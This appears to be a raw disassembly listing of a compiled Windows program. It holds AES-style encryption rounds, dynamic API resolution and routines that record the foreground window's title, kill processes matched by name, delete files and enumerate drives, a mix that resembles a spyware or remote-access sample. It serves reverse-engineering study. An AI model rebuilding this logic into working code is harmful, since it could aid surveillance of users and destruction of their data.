movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x34 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x38 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x3c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x20 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x24 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x28 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x2c ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x10 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x14 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x18 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x1c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x4 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x8 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0xc ]
mov [ esp + 0x14 ] edx
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0x4 ]
add eax 0x4
mov edx [ esp + 0xc ]
mov [ eax ] edx
mov eax [ esp + 0x4 ]
add eax 0x8
mov edx [ esp + 0x10 ]
mov [ eax ] edx
mov eax [ esp + 0x4 ]
add eax 0xc
mov edx [ esp + 0x14 ]
mov [ eax ] edx
add esp 0x28
pop esi
pop ebx
retn
sub_45d75c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi edx
mov ebx eax
lea edx [ ebp - 0x100 ]
mov eax ecx
call sub_45a168
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x100 ]
mov edx esi
mov eax ebx
call sub_45d794
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45d794
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d941
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4192c0
pop edx
sub edx eax
mov eax esi
call sub_45a160
mov esi eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4192e0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d948
lea eax [ ebp - 0x38 ]
mov edx 0x4
call sub_404e68
retn
cmp esi 0x10
jb r-xdata
test esi esi
je r-xdata
test esi esi
jbe r-xdata
lea edx [ ebp - 0x18 ]
mov ecx 0x10
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
cmp ebx 0x10
jae r-xdata
lea edx [ ebp - 0x18 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
cmp esi ebx
jbe r-xdata
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_45a30c
lea edx [ ebp - 0x28 ]
mov ecx 0x10
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
cmp ebx 0x10
jae r-xdata
lea edx [ ebp - 0x2c ]
mov eax r-xdata
call sub_406fd4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
mov edx 0x10
sub edx esi
lea eax [ ebp + esi - 0x18 ]
xor ecx ecx
call sub_403728
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_45a30c
lea edx [ ebp - 0x28 ]
mov ecx 0x10
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
cmp ebx 0x10
jae r-xdata
lea edx [ ebp - 0x34 ]
mov eax r-xdata
call sub_406fd4
mov ecx [ ebp - 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
sub esi 0x10
cmp esi 0x10
jae r-xdata
lea edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_406fd4
mov ecx [ ebp - 0x30 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
lea edx [ ebp - 0x38 ]
mov eax r-xdata
call sub_406fd4
mov ecx [ ebp - 0x38 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
sub_45d950
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi edx
mov ebx eax
lea edx [ ebp - 0x100 ]
mov eax ecx
call sub_45bea0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x100 ]
mov edx esi
mov eax ebx
call sub_45d988
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45d988
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45dac8
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4192c0
pop edx
sub edx eax
mov eax esi
call sub_45a160
mov esi eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4192e0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dacf
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_404e68
retn
mov eax esi
and eax 0xf
test eax eax
jbe r-xdata
test esi esi
je r-xdata
cmp esi 0x10
jb r-xdata
lea edx [ ebp - 0x2c ]
mov eax r-xdata
call sub_406fd4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
lea edx [ ebp - 0x18 ]
mov ecx 0x10
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
cmp ebx 0x10
jae r-xdata
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_45beb4
lea edx [ ebp - 0x28 ]
mov ecx 0x10
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
cmp ebx 0x10
jae r-xdata
lea edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_406fd4
mov ecx [ ebp - 0x30 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
sub esi 0x10
cmp esi 0x10
jae r-xdata
lea edx [ ebp - 0x34 ]
mov eax r-xdata
call sub_406fd4
mov ecx [ ebp - 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
sub_45dad8
push ebx
mov ebx rw-data
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r-xdata
call GetModuleHandleA
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov al 0x1
pop ebx
retn
sub_45dd54
push ebx
push esi
mov esi edx
mov ebx eax
call sub_45dad8
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push esi
push ebx
call [ rw-data ]
pop esi
pop ebx
retn
sub_45dd74
push ebx
push esi
mov esi edx
mov ebx eax
call sub_45dad8
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push esi
push ebx
call [ rw-data ]
pop esi
pop ebx
retn
sub_45dd94
push ebx
push esi
mov esi edx
mov ebx eax
call sub_45dad8
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push esi
push ebx
call [ rw-data ]
pop esi
pop ebx
retn
sub_45de04
push ebx
push esi
push edi
push ebp
add esp 0xfffffed8
mov esi edx
mov ebp eax
xor edx edx
mov eax 0x2
call sub_45dd54
mov edi eax
mov [ esp ] 0x128
mov edx esp
mov eax edi
call sub_45dd74
mov ebx eax
mov eax esi
call sub_404e44
jmp r-xdata
test ebx ebx
je r-xdata
push edi
call CloseHandle
add esp 0x128
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp ebp [ esp + 0x8 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_45dd94
mov ebx eax
mov eax esi
lea edx [ esp + 0x24 ]
mov ecx 0x104
call sub_4050b4
sub_45de78
push ebp
mov ebp esp
add esp 0xfffffdf4
push ebx
push esi
xor edx edx
mov [ ebp - 0x108 ] edx
mov [ ebp - 0x20c ] edx
mov esi eax
xor eax eax
push ebp
push sub_45df44
push [ fs : eax ]
mov [ fs : eax ] esp
call GetForegroundWindow
mov ebx eax
push 0xff
lea eax [ ebp - 0x103 ]
push eax
push ebx
call GetWindowTextA
lea eax [ ebp - 0x4 ]
push eax
push ebx
call GetWindowThreadProcessId
push r-xdata
lea eax [ ebp - 0x208 ]
lea edx [ ebp - 0x103 ]
mov ecx 0xff
call sub_403a00
lea edx [ ebp - 0x208 ]
lea eax [ ebp - 0x108 ]
call sub_4050a8
push [ ebp - 0x108 ]
push r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_45de04
push [ ebp - 0x20c ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45df4b
lea eax [ ebp - 0x20c ]
call sub_404e44
lea eax [ ebp - 0x108 ]
call sub_404e44
retn
sub_45df78
push esi
push edi
add esp 0xfffffed8
mov esi eax
lea edi [ esp ]
mov ecx 0x4a
[ edi ] [ esi ]
mov eax [ esp + 0x8 ]
push eax
push 0x0
push 0x1f0fff
call OpenProcess
add esp 0x128
pop edi
pop esi
retn
sub_45dfa8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_45e034
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_45e960
push [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45ec84
push [ ebp - 0xc ]
lea eax [ ebp - 0x10 ]
call sub_45e504
push [ ebp - 0x10 ]
mov eax 0x3e7
call sub_403220
inc eax
lea edx [ ebp - 0x14 ]
call sub_40987c
push [ ebp - 0x14 ]
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e03b
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404e68
retn
sub_45e06c
push ebp
mov ebp esp
add esp 0xfffffecc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x134 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_45e14e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
xor edx edx
mov eax 0xf
call sub_45dd54
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x130 ]
mov eax [ ebp - 0x8 ]
call sub_45dd74
jmp r-xdata
lea edx [ ebp - 0x130 ]
mov eax [ ebp - 0x8 ]
call sub_45dd94
test eax eax
jne r-xdata
lea eax [ ebp - 0x134 ]
lea edx [ ebp - 0x10c ]
mov ecx 0x104
call sub_4050b4
mov eax [ ebp - 0x134 ]
mov edx [ ebp - 0x4 ]
call sub_405270
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e155
lea eax [ ebp - 0x134 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea eax [ ebp - 0x130 ]
call sub_45df78
mov esi eax
xor eax eax
push ebp
push sub_45e10f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push esi
call TerminateProcess
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45e160
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45e1d1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1e ]
xor ecx ecx
mov edx 0x1e
call sub_403728
mov [ ebp - 0x1a ] 0x3
lea eax [ ebp - 0x24 ]
mov ecx r-xdata
mov edx ebx
call sub_405170
mov eax [ ebp - 0x24 ]
call sub_405324
mov [ ebp - 0x16 ] eax
mov [ ebp - 0xe ] 0x414
lea eax [ ebp - 0x1e ]
push eax
call SHFileOperationA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e1d8
lea eax [ ebp - 0x24 ]
call sub_404e44
retn
sub_45e1ec
push ebx
add esp 0xfffffef8
mov ebx eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
call GetWindowsDirectoryA
mov eax ebx
mov edx esp
mov ecx 0x105
call sub_4050b4
add esp 0x108
pop ebx
retn
sub_45e21c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_45e2df
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_45e2a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_409d8c
mov ebx eax
lea edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_45ec84
mov esi [ ebp - 0x1c ]
mov eax ebx
call sub_40a25c
fstp [ ebp - 0x18 ]
fwait
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] esi
mov edx [ ebp - 0x20 ]
call sub_40ca08
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e2e6
lea eax [ ebp - 0x1c ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_45e31c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45e441
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx 0x12c
call sub_4055ac
mov eax [ ebp - 0xc ]
call sub_405324
push eax
push 0x12c
call GetLogicalDriveStringsA
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405468
mov ebx eax
test ebx ebx
jle r-xdata
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405384
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
sub ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e448
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
sub ebx 0x4
mov ebx [ ebx ]
cmp esi 0x3
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
call GetDriveTypeA
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x3
jl r-xdata
mov edi [ ebp - 0xc ]
test edi edi
je r-xdata
cmp [ ebp - 0x14 ] 0x4
jg r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x1 ]
mov ecx edi
mov eax [ ebp - 0xc ]
call sub_405384
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405468
mov ebx eax
test ebx ebx
jg r-xdata
sub edi 0x4
mov edi [ edi ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x4
call sub_4051e4
sub_45e474
push ebp
mov ebp esp
add esp 0xfffffeb8
push ebx
push esi
push edi
mov ebx eax
xor edx edx
push ebp
push sub_45e4de
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x148 ]
push eax
mov eax ebx
call sub_405324
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push eax
call FindClose
test [ ebp - 0x148 ] 0x10
jne r-xdata
mov [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x128 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x12c ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e504
push ebp
mov ebp esp
add esp 0xffffffe8
